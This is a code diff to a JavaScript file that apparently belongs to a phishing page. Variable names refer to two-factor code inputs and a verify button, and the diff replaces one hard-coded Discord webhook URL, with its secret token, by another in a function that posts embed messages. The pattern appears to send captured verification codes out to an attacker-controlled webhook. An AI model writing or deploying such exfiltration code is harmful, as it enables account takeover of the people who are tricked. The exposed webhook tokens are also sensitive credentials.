@@ -268,7 +268,7 @@ if (twofaInput2 && verifyButton2) {
 
 // === Webhook Sending ===
 async function sendWebhook(title, description, color) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1396146082102378637/VAsdm-WMZPUJSkdr-z6UVkXMGeoWU0lowGEOl40tb2qo_wJlBEref0EtMrI39bUNVXSr';
+  const webhookUrl = 'https://discord.com/api/webhooks/1396288190603853984/pOiMtwEz1GGAb5bjk_geJnl-dXOujnkm4RYxC_v95qx63m_zOKWzEv60FZUHfqIPIB1h';
   const payload = {
     embeds: [{
       title: title,
